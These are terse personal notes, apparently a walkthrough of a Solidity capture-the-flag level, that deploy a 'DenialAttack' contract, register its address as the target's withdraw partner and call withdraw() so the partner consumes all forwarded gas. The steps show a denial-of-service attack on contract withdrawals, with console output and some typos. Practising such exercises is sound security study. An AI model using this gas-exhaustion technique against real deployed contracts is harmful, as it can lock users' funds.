1. deploy DenialAttack.sol 
2. > contract
n {methods: {…}, abi: Array(6), address: '0x084d1e5F01b1bf2ad05080D1f5843237BfeD49Cc', transactionHash: undefined, constructor: ƒ, …} 

3.paste DenialAttack address //DenialAttack be WithdrawPartner, always assert error if you try to withdraw fund
ontract.setWithdrawPartner("0x97EB3A7dcd84b417317045af7e6351c4750AD6e5")

4. contract.withdraw() //partner.call{value:amountToSend}(""); gonna foeward all of the remaining gas for this trnasaction to execute this function 